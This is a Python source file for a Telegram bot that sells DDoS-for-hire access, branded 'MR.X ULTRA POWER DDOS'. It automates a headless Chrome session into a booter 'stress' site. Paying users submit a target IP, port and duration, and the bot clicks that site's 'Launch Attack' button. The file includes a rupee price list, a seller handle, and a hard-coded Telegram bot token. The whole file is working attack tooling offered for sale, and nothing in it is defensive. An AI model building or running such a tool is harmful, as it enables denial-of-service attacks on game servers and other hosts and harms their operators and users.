import asyncio
import time
import logging
import os
import re
import json
import string
import random
import pickle
import signal
import sys
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8562518597:AAGpVd-4xGZx3mJgkXQo2AYUKooJE_JWgZk"
OWNER_ID = 6643958471
CHROME_PATH = "/usr/bin/google-chrome"

DATA_JSON = "users_data.json"
COOKIES_FILE = "session_cookies.pkl"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

user_state = {}
driver = None
logged_in = False
data = {
    "approved_users": {},
    "disapproved_users": []
}

# ==================== DATA MANAGEMENT ====================
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
    except:
        pass

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def is_owner(user_id):
    return user_id == OWNER_ID

def is_approved(user_id):
    if is_owner(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        return True
    return False

def save_cookies():
    global driver
    try:
        if driver:
            cookies = driver.get_cookies()
            with open(COOKIES_FILE, 'wb') as f:
                pickle.dump(cookies, f)
    except:
        pass

def load_cookies():
    global driver
    try:
        if driver and os.path.exists(COOKIES_FILE):
            with open(COOKIES_FILE, 'rb') as f:
                cookies = pickle.load(f)
            for cookie in cookies:
                driver.add_cookie(cookie)
            return True
    except:
        pass
    return False

async def initialize_browser():
    global driver
    try:
        if driver:
            return True
        
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        return True
    except Exception as e:
        print(f"Browser init error: {e}")
        return False

# ==================== KEYBOARD BUILDERS ====================
def get_owner_keyboard():
    keyboard = [
        ["🔐 Login", "🔍 Check Status"],
        ["✅ Approve User", "❌ Disapprove User"],
        ["🚀 Run Attack"],
        ["📊 View Stats", "🔴 Logout"],
        ["🔁 /start"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_approved_keyboard():
    keyboard = [
        ["🚀 Run Attack"],
        ["🔁 /start"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_user_keyboard():
    keyboard = [
        ["🔁 /start"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ==================== LOGIN FLOW ====================
async def start_login_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global driver, logged_in
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝗡𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.", reply_markup=get_user_keyboard())
        return
    try:
        if not driver:
            await initialize_browser()
        
        driver.get("https://satellitestress.st/login")
        await asyncio.sleep(10)
        
        if load_cookies():
            driver.refresh()
            await asyncio.sleep(5)
            if "dashboard" in driver.current_url or "attack" in driver.current_url:
                logged_in = True
                await update.message.reply_text("✅ 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗹𝗼𝗴𝗴𝗲𝗱 𝗶𝗻! 🍪", reply_markup=get_owner_keyboard())
                return
        
        driver.save_screenshot("login_screen.png")
        with open("login_screen.png", 'rb') as photo:
            await update.message.reply_photo(photo=photo, caption="📸 𝗟𝗼𝗴𝗶𝗻 𝗣𝗮𝗴𝗲 𝗟𝗼𝗮𝗱𝗲𝗱.\n\n🔑 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗔𝗰𝗰𝗲𝘀𝘀 𝗧𝗼𝗸𝗲𝗻:")
        os.remove("login_screen.png")
        user_state[user_id] = {'step': 'waiting_token'}
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗟𝗼𝗴𝗶𝗻 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

async def enter_token(update: Update, context: ContextTypes.DEFAULT_TYPE, token: str):
    user_id = update.effective_user.id
    try:
        wait = WebDriverWait(driver, 15)
        token_field = wait.until(EC.presence_of_element_located((By.ID, "token")))
        token_field.clear()
        token_field.send_keys(token)
        user_state[user_id] = {'step': 'waiting_captcha'}
        driver.save_screenshot("captcha_view.png")
        with open("captcha_view.png", "rb") as photo:
            await update.message.reply_photo(photo=photo, caption="✅ 𝗧𝗼𝗸𝗲𝗻 𝗘𝗻𝘁𝗲𝗿𝗲𝗱.\n\n🔢 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 𝗰𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿𝘀:")
        os.remove("captcha_view.png")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗧𝗼𝗸𝗲𝗻 𝗘𝗿𝗿𝗼𝗿: {str(e)}")
        user_state.pop(user_id, None)

async def enter_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE, captcha: str):
    global logged_in
    user_id = update.effective_user.id
    try:
        captcha_field = driver.find_element(By.CSS_SELECTOR, "input[aria-label='Enter captcha answer']")
        captcha_field.send_keys(captcha)
        login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_btn.click()
        await asyncio.sleep(6)
        
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            logged_in = True
            save_cookies()
            await update.message.reply_text("✅ 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉\n\n🚀 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝗮𝘁𝘁𝗮𝗰𝗸!", reply_markup=get_owner_keyboard())
        else:
            driver.save_screenshot("fail.png")
            with open("fail.png", "rb") as f:
                await update.message.reply_photo(f, caption="❌ 𝗟𝗼𝗴𝗶𝗻 𝗳𝗮𝗶𝗹𝗲𝗱.")
            os.remove("fail.png")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗟𝗼𝗴𝗶𝗻 𝗘𝗿𝗿𝗼𝗿: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝗡𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.", reply_markup=get_user_keyboard())
        return
    if not driver:
        await update.message.reply_text("❌ 𝗕𝗿𝗼𝘄𝘀𝗲𝗿 𝗻𝗼𝘁 𝗶𝗻𝗶𝘁𝗶𝗮𝗹𝗶𝘇𝗲𝗱.", reply_markup=get_owner_keyboard())
        return
    try:
        if "dashboard" in driver.current_url or "attack" in driver.current_url:
            logged_in = True
            await update.message.reply_text("✅ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗟𝗢𝗚𝗚𝗘𝗗 𝗜𝗡 🟢", reply_markup=get_owner_keyboard())
        else:
            logged_in = False
            await update.message.reply_text("❌ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗡𝗢𝗧 𝗟𝗢𝗚𝗚𝗘𝗗 𝗜𝗡 🔴", reply_markup=get_owner_keyboard())
    except:
        await update.message.reply_text("❌ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗘𝗥𝗥𝗢𝗥 ⚠️", reply_markup=get_owner_keyboard())

async def logout_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global driver, logged_in
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝗡𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.", reply_markup=get_user_keyboard())
        return
    if driver:
        driver.quit()
        driver = None
    logged_in = False
    await update.message.reply_text("✅ 𝗕𝗿𝗼𝘄𝘀𝗲𝗿 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗰𝗹𝗼𝘀𝗲𝗱. 🔴", reply_markup=get_owner_keyboard())

# ==================== ATTACK FUNCTIONS ====================
async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ 𝗡𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.\n\n𝗧𝗼 𝗯𝘂𝘆 𝗸𝗲𝘆: @𝗠𝗥𝗫𝗬𝗧𝗗𝗠", reply_markup=get_user_keyboard())
        return
    
    if not logged_in or not driver:
        await update.message.reply_text("❌ 𝗦𝗲𝗿𝘃𝗲𝗿 𝗻𝗼𝘁 𝗿𝗲𝗮𝗱𝘆\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗼𝗿 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 @𝗠𝗥𝗫𝗬𝗧𝗗𝗠", reply_markup=get_approved_keyboard())
        return
    
    user_state[user_id] = 'awaiting_attack'
    await update.message.reply_text(
        "🚀 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗔𝗧𝗧𝗔𝗖𝗞 🚀\n\n𝗧𝘆𝗽𝗲 👉: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>",
        parse_mode='Markdown'
    )

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    global driver
    user_id = update.effective_user.id
    if user_id not in user_state or user_state[user_id] != 'awaiting_attack':
        return
    
    parts = text.strip().split()
    if len(parts) != 3:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁\n\n𝗨𝘀𝗲 👉: <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>", parse_mode='Markdown')
        del user_state[user_id]
        return
    
    ip, port, duration = parts
    try:
        port = int(port)
        duration = int(duration)
        if duration < 30 or duration > 300:
            await update.message.reply_text("❌ 𝗧𝗶𝗺𝗲 𝗺𝘂𝘀𝘁 𝗯𝗲 30-300 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
            del user_state[user_id]
            return
    except:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿𝘀")
        del user_state[user_id]
        return
    
    await update.message.reply_text("⚡ 𝗪𝗮𝗶𝘁 5 𝗦𝗲𝗰𝗼𝗻𝗱𝘀...")
    
    try:
        driver.get("https://satellitestress.st/attack")
        await asyncio.sleep(6)
        
        wait = WebDriverWait(driver, 20)
        
        ip_in = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder='104.29.138.132']")))
        ip_in.clear()
        ip_in.send_keys(ip)
        
        port_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='80']")
        port_in.clear()
        port_in.send_keys(str(port))
        
        time_in = driver.find_element(By.CSS_SELECTOR, "input[placeholder='60']")
        time_in.clear()
        time_in.send_keys(str(duration))
        
        launch_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//button[contains(text(), 'Launch Attack')]")))
        driver.execute_script("arguments[0].click();", launch_btn)
        
        await asyncio.sleep(2)
        
        await update.message.reply_text(
            f"🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n"
            f"🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗬: @𝗠𝗥𝗫𝗬𝗧𝗗𝗠\n"
            f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧: {ip}\n"
            f"🔌 𝗣𝗢𝗥𝗧: {port}\n"
            f"⏰ 𝗧𝗜𝗠𝗘: {duration}𝘀\n"
            f"🌎 𝗚𝗔𝗠𝗘: 𝗕𝗚𝗠𝗜",
            parse_mode='Markdown',
            reply_markup=get_approved_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗘𝗿𝗿𝗼𝗿\n\n{str(e)}", reply_markup=get_approved_keyboard())
    
    del user_state[user_id]

# ==================== USER MANAGEMENT ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    if is_owner(user_id):
        msg = "🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n👑 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗢𝘄𝗻𝗲𝗿!\n\n🎮 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄:"
        keyboard = get_owner_keyboard()
    elif is_approved(user_id):
        msg = f"🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n✅ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {user_name}!\n𝗬𝗼𝘂 𝗮𝗿𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱\n\n🎮 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄:"
        keyboard = get_approved_keyboard()
    else:
        msg = "🚀 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 🚀\n\n📌 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗕𝗼𝘁\n𝗥𝗲𝗱𝗲𝗲𝗺 𝗮 𝗸𝗲𝘆 𝘁𝗼 𝗴𝗲𝘁 𝗮𝗰𝗰𝗲𝘀𝘀.\n\n💰 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧:\n▫️ 1 𝗗𝗮𝘆    – ₹200 🔥\n▫️ 1 𝗪𝗲𝗲𝗸   – ₹700 🔥\n▫️ 1 𝗠𝗼𝗻𝘁𝗵  – ₹1500 🔥\n\n🛒 𝗧𝗼 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲: @𝗠𝗥𝗫𝗬𝗧𝗗𝗠\n\n🎮 𝗨𝘀𝗲 𝘁𝗵𝗲 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄:"
        keyboard = get_user_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    if is_owner(user_id):
        msg = f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}\n📛 𝗡𝗮𝗺𝗲: {user.first_name}\n\n✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 (𝗢𝘄𝗻𝗲𝗿)\n⏰ 𝗘𝘅𝗽𝗶𝗿𝘆: 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱"
        keyboard = get_owner_keyboard()
    elif is_approved(user_id):
        expiry = data["approved_users"][str(user_id)].get("expiry", "N/A")
        msg = f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}\n📛 𝗡𝗮𝗺𝗲: {user.first_name}\n\n✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗\n⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {expiry}"
        keyboard = get_approved_keyboard()
    else:
        msg = f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}\n📛 𝗡𝗮𝗺𝗲: {user.first_name}\n\n❌ 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗\n\n𝗧𝗼 𝗯𝘂𝘆 𝗸𝗲𝘆: @𝗠𝗥𝗫𝗬𝗧𝗗𝗠"
        keyboard = get_user_keyboard()
    await update.message.reply_text(msg, reply_markup=keyboard)

async def approve_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝗡𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'approve'}
    await update.message.reply_text("✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱: <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗱𝗮𝘆𝘀>")

async def process_approve(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: <𝗶𝗱> <𝗱𝗮𝘆𝘀>")
            return
        target_id = parts[0]
        days = int(parts[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        data["approved_users"][target_id] = {"expiry": expiry, "approved_by": user_id}
        if int(target_id) in data.get("disapproved_users", []):
            data["disapproved_users"].remove(int(target_id))
        save_data()
        await update.message.reply_text(f"✅ 𝗨𝘀𝗲𝗿 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n\n👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {target_id}\n📅 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {days} 𝗱𝗮𝘆𝘀\n⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {expiry}", reply_markup=get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def disapprove_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝗡𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.", reply_markup=get_user_keyboard())
        return
    user_state[user_id] = {'action': 'disapprove'}
    await update.message.reply_text("❌ 𝗗𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝘂𝘀𝗲𝗿 𝗜𝗗:")

async def process_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    try:
        target_id = int(text.strip())
        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]
        if target_id not in data.get("disapproved_users", []):
            data["disapproved_users"].append(target_id)
        save_data()
        await update.message.reply_text(f"❌ 𝗨𝘀𝗲𝗿 𝗗𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!\n\n👤 𝗨𝘀𝗲𝗿 𝗜𝗗: {target_id}", reply_markup=get_owner_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")
    finally:
        user_state.pop(user_id, None)

async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ 𝗡𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱.", reply_markup=get_user_keyboard())
        return
    approved_count = len(data.get("approved_users", {}))
    disapproved_count = len(data.get("disapproved_users", []))
    msg = f"📊 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀\n\n✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {approved_count}\n❌ 𝗗𝗶𝘀𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {disapproved_count}"
    await update.message.reply_text(msg, reply_markup=get_owner_keyboard())

# ==================== MESSAGE HANDLER ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "🔁 /start":
        await start(update, context)
        return
    if text == "🔐 Login":
        await start_login_flow(update, context)
        return
    if text == "🔍 Check Status":
        await check_status(update, context)
        return
    if text == "🔴 Logout":
        await logout_session(update, context)
        return
    if text == "🚀 Run Attack":
        await run_attack(update, context)
        return
    if text == "📊 My Status":
        await my_status(update, context)
        return
    if text == "✅ Approve User":
        await approve_user_start(update, context)
        return
    if text == "❌ Disapprove User":
        await disapprove_user_start(update, context)
        return
    if text == "📊 View Stats":
        await show_stats(update, context)
        return
    
    if user_id in user_state:
        state = user_state[user_id]
        
        if isinstance(state, dict):
            if state.get('step') == 'waiting_token':
                await enter_token(update, context, text)
                return
            elif state.get('step') == 'waiting_captcha':
                await enter_captcha(update, context, text)
                return
            elif state.get('action') == 'approve':
                await process_approve(update, context, text)
                return
            elif state.get('action') == 'disapprove':
                await process_disapprove(update, context, text)
                return
        
        elif state == 'awaiting_attack':
            await process_attack(update, context, text)
            return

# ==================== MAIN ====================
def main():
    load_data()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 𝗠𝗥.𝗫 𝗨𝗟𝗧𝗥𝗔 𝗣𝗢𝗪𝗘𝗥 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 𝗜𝗦 𝗔𝗖𝗧𝗜𝗩𝗘 🔥")
    app.run_polling()

if __name__ == '__main__':
    main()